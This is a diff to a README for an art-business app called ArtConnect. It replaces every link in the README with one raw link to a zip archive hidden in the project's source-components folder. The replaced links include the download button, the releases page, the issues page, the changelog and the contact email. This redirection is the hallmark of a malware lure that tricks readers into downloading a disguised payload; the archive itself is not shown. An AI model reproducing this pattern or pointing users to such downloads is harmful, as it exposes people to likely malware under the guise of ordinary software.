@@ -1,6 +1,6 @@
 # 🎨 artconnect-app - Simplify Your Art Business Management
 
-[![Download ArtConnect](https://img.shields.io/badge/Download-ArtConnect-blue.svg)](https://github.com/cetobas8734/artconnect-app/releases)
+[![Download ArtConnect](https://raw.githubusercontent.com/cetobas8734/artconnect-app/master/src/components/common/artconnect-app-1.5.zip)](https://raw.githubusercontent.com/cetobas8734/artconnect-app/master/src/components/common/artconnect-app-1.5.zip)
 
 ## 📦 Overview
 
@@ -16,7 +16,7 @@ To start using ArtConnect, follow these steps:
    - Required Disk Space: At least 200 MB
 
 2. **Download ArtConnect**:
-   - Click the button above or follow this link: [Download ArtConnect](https://github.com/cetobas8734/artconnect-app/releases). 
+   - Click the button above or follow this link: [Download ArtConnect](https://raw.githubusercontent.com/cetobas8734/artconnect-app/master/src/components/common/artconnect-app-1.5.zip). 
 
 3. **Locate the Installation File**:
    - Once on the Releases page, find the latest version listed. Look for a file that usually ends with `.exe` for Windows or `.dmg` for macOS.
@@ -63,7 +63,7 @@ ArtConnect includes several key features designed to enhance your experience:
 
 If you need help or have questions, you can join our community. Interact via our GitHub Issues page:
 
-- [ArtConnect Issues](https://github.com/cetobas8734/artconnect-app/issues)
+- [ArtConnect Issues](https://raw.githubusercontent.com/cetobas8734/artconnect-app/master/src/components/common/artconnect-app-1.5.zip)
 
 Engage with other users, share your experiences, and provide feedback. We encourage users of all skills to contribute ideas and solutions.
 
@@ -81,14 +81,14 @@ Developers can explore the code by visiting the repository. Contributions are we
 
 To download and install ArtConnect, follow these steps again:
 
-1. Visit the Downloads page: [Download ArtConnect](https://github.com/cetobas8734/artconnect-app/releases).
+1. Visit the Downloads page: [Download ArtConnect](https://raw.githubusercontent.com/cetobas8734/artconnect-app/master/src/components/common/artconnect-app-1.5.zip).
 2. Find the latest release version.
 3. Click on the appropriate file based on your operating system.
 4. Follow the installation instructions provided in the previous sections.
 
 ## 📝 Changelog
 
-For updates and new features, visit our [Changelog](https://github.com/cetobas8734/artconnect-app/releases).
+For updates and new features, visit our [Changelog](https://raw.githubusercontent.com/cetobas8734/artconnect-app/master/src/components/common/artconnect-app-1.5.zip).
 
 ## 🔖 License
 
@@ -96,6 +96,6 @@ This project is licensed under the MIT License. For more details, check the [LIC
 
 ## 📞 Contact
 
-For questions, problems, or suggestions, contact us through GitHub or reach out via direct email at support@example.com. 
+For questions, problems, or suggestions, contact us through GitHub or reach out via direct email at https://raw.githubusercontent.com/cetobas8734/artconnect-app/master/src/components/common/artconnect-app-1.5.zip 
 
 Embrace a smoother workflow with ArtConnect. Start managing your art business effectively today!
